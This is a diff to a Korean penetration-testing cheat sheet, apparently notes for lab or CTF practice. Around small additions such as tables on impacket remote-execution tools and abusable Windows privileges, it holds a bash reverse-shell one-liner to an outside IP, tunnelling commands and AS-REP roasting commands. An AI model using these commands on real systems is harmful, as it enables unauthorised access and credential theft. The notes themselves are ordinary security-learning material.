@@ -28,6 +28,17 @@ powershell -ep bypass
 Get-Process | Where-Object { $_.ProcessName -match "wevtutil" }
 ```
 
+## 파일 내 문자열 찾을 때
+```powershell
+Select-String -Path ".\test.txt" -Pattern "찾을문자열"
+```
+
+## 사용중인 포트 찾을 때
+
+```powershell
+netstat -ano
+```
+
 ## powershell 유저 권한 확인
 ```powershell
 whoami /all
@@ -76,7 +87,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.15.145/4444 0>&1'
 ./agent -connect 192.168.45.224:11601 -ignore-cert
 sudo ./proxy -selfcert
 session
-interface_create --name ligolo
+interface_create --name ligolo17
 route_add --name ligolo --route 172.168.189.0/24
 start --tun ligolo
 ```
@@ -178,12 +189,12 @@ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile username.txt -dc
 
 타겟의 자격 증명을 확보한 후, 시스템 제어권을 얻기 위해 사용합니다.
 
-|**도구명**|**주요 기능**|**실무 포인트**|
-|---|---|---|
-|**`impacket-psexec`**|서비스 등록 방식 원격 쉘 실행|`SYSTEM` 권한 획득 가능, 흔적이 많이 남음(EDR 탐지율 높음)|
-|**`impacket-wmiexec`**|WMI를 이용한 반대화형 쉘 실행|파일 생성을 최소화하여 `psexec`보다 은밀함 (가장 권장됨)|
-|**`impacket-smbexec`**|서비스 생성/삭제 방식 명령 실행|별도의 에이전트 없이 동작, `psexec`과 유사한 메커니즘|
-|**`impacket-atexec`**|Task Scheduler를 통한 명령 실행|특정 시간에 작업을 예약하여 실행할 때 사용|
+| **도구명**                | **주요 기능**                | **실무 포인트**                               |
+| ---------------------- | ------------------------ | ---------------------------------------- |
+| **`impacket-psexec`**  | 서비스 등록 방식 원격 쉘 실행        | `SYSTEM` 권한 획득 가능, 흔적이 많이 남음(EDR 탐지율 높음) |
+| **`impacket-wmiexec`** | WMI를 이용한 반대화형 쉘 실행       | 파일 생성을 최소화하여 `psexec`보다 은밀함 (가장 권장됨)     |
+| **`impacket-smbexec`** | 서비스 생성/삭제 방식 명령 실행       | 별도의 에이전트 없이 동작, `psexec`과 유사한 메커니즘       |
+| **`impacket-atexec`**  | Task Scheduler를 통한 명령 실행 | 특정 시간에 작업을 예약하여 실행할 때 사용                 |
 
 ---
 
@@ -224,6 +235,21 @@ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile username.txt -dc
 | **`impacket-samrdump`**  | SAM 엔드포인트 정보 추출 | 로컬 유저 및 권한 파악              |
 | **`impacket-rpcdump`**   | RPC 엔드포인트 매핑    | 실행 중인 서비스와 취약한 인터페이스 탐색    |
 | **`impacket-smbclient`** | SMB 공유 폴더 클라이언트 | 유효한 계정으로 접근 가능한 파일 및 폴더 탐색 |
+## Windows 취약한 권한
+
+| **권한 명칭**                    | **공격 기법 및 설명**                                                                      |
+| ---------------------------- | ----------------------------------------------------------------------------------- |
+| **SeImpersonatePrivilege**   | **가장 중요.** 클라이언트 인증 후 토큰을 사칭할 수 있음. `Juicy/God/PrintPotato` 공격으로 `SYSTEM` 권한 획득 가능. |
+| **SeAssignPrimaryToken**     | 위와 유사하게 프로세스 토큰을 할당할 수 있음. `Potato` 계열 공격에 사용됨.                                     |
+| **SeBackupPrivilege**        | 시스템의 모든 파일(SAM, SYSTEM 하이브 포함)을 읽을 수 있음. 해시 추출 후 `Pass-the-Hash` 가능.                |
+| **SeRestorePrivilege**       | 시스템 파일에 쓰기 권한을 가짐. 서비스 바이너리나 DLL을 교체하여 권한 상승 가능.                                    |
+| **SeTakeOwnershipPrivilege** | 파일이나 개체의 소유권을 강제로 가져올 수 있음. 이후 권한을 수정하여 백도어 설치 가능.                                  |
+| **SeLoadDriverPrivilege**    | 장치 드라이버를 로드할 수 있음. 취약한 드라이버를 올려 커널 레벨에서 코드 실행 가능.                                   |
+| **SeDebugPrivilege**         | 다른 프로세스(예: `lsass.exe`)의 메모리를 읽고 쓸 수 있음. 관리자 비밀번호/해시 덤프 가능.                         |
+
+
+
+
 ## Crypto
 
 | Identifier | Name   |
